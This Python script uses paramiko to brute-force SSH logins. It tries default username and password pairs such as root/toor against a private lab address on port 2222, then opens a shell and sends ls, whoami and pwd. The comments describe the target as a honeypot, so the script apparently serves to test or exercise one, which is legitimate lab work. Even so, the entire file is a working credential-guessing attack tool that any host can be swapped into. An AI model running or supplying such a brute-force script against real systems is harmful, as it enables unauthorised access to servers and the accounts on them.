import paramiko
import time


TARGET_IP = "10.0.2.4"  
TARGET_PORT = 2222           
USERNAME_LIST = ["root", "admin", "user"]
PASSWORD_LIST = ["toor", "123456", "password"]

# Brute force function
def brute_force_ssh(ip, port, usernames, passwords):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("[*] Starting brute force attack...")
    for username in usernames:
        for password in passwords:
            try:
                print(f"[!] Trying {username}:{password}")
                ssh_client.connect(ip, port=port, username=username, password=password, timeout=3)
                print(f"[+] Success! Credentials: {username}:{password}")
                return ssh_client, username, password
            except paramiko.AuthenticationException:
                print(f"[-] Failed {username}:{password}")
            except Exception as e:
                print(f"[!] Error: {e}")
                return None, None, None
    print("[-] Brute force attack failed.")
    return None, None, None

# Simulate interaction with the honeypot
def interact_with_honeypot(ssh_client):
    channel = ssh_client.invoke_shell()
    print("[*] Fake shell opened. Sending commands...")
    try:
        # Simulate sending commands
        commands = ["ls", "whoami", "pwd"]
        for cmd in commands:
            channel.send(f"{cmd}\n")
            time.sleep(1)
            output = channel.recv(65535).decode()
            print(f"[*] Command: {cmd}")
            print(output)
    except Exception as e:
        print(f"[!] Error interacting with honeypot: {e}")
    finally:
        channel.close()

# Main function
def main():
    ssh_client, username, password = brute_force_ssh(TARGET_IP, TARGET_PORT, USERNAME_LIST, PASSWORD_LIST)
    if ssh_client:
        print("[*] Connected. Simulating interaction...")
        interact_with_honeypot(ssh_client)
        ssh_client.close()
    else:
        print("[-] Attack failed. No credentials worked.")

if __name__ == "__main__":
    main()
